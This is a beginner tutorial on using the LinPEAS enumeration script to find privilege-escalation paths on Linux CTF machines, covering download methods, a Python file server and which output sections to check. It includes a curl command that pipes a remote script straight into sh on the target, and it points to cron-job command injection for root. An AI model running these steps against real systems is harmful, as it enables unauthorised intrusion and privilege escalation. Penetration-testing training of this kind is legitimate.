LinPEAS

LinPEAS is a script that you can download and run that will give you a list of possible vulnerabilities and paths to escalate. You can download LinPEAS here
LinPEAS is for Linux-based systems. If you are doing a Windows box, you will need WinPEAS

CTF Usage:

    When you finally gain access to the target machine, your steps should be:
  • 1. cat user.txt
  • 2. sudo -l
  • 3. LinPEAS!

Download to target machine

    If you are able to download directly to your target machine, that is great! Just type the command:
  • curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

This will automatically run the script and it may take some time.

Download to your machine

Sometimes you won't be able to download files onto the target machine. They often do not have internet access or the user you are in as won't have permission.
You will need to download it to your machine and save it as a .sh file and then transfer it to the target machine.
Do this by replacing the | with a > and then whatever you would like to name it.

    Next step is to start a python server on your machine.
  • python3 -m http.server

You can add a specific port but you do not need to. It will just automatically be 8000

Curl the file from your machine to the target.

If the machine can't curl, you can try wget or python. With curl, you always need > it into a new file but wget will do it for you.

Use chmod to change the permissions on the file. Using +x is giving permission to run the file.

Run the file!

What to Look For:

LinPEAS provides a legend to help you distinguish how vulnerable things are.
It's a good idea to quickly glance over the results and if you see anything highlighted in red/yellow, look at the category it's in and if there are any links.

Cron Jobs

Cron Jobs are scheduled tasks.
They are nice to look for because the Cron Job may run with sudo privileges and you may be able to inject a command to give you root access the next time it runs.

Network Information and Active Ports

This can tell you hosts, services or other open ports that are running on the machine that were not revealed by previous scans.

Useful Software

These are programs that are already installed on the computer that you can run. Sometimes these are used to gain root access.
Once you find any useful software, you can check GTFOBins for specific ways to break out of that program.

Interesting Files

These need to be evaluated on a case-by-case basis, but it is a good starting point for privilege escalation.

Files modified in the last 5 minutes

This is a way to see if Cron Jobs are modifying any programs or anything else that works like a Cron Job.
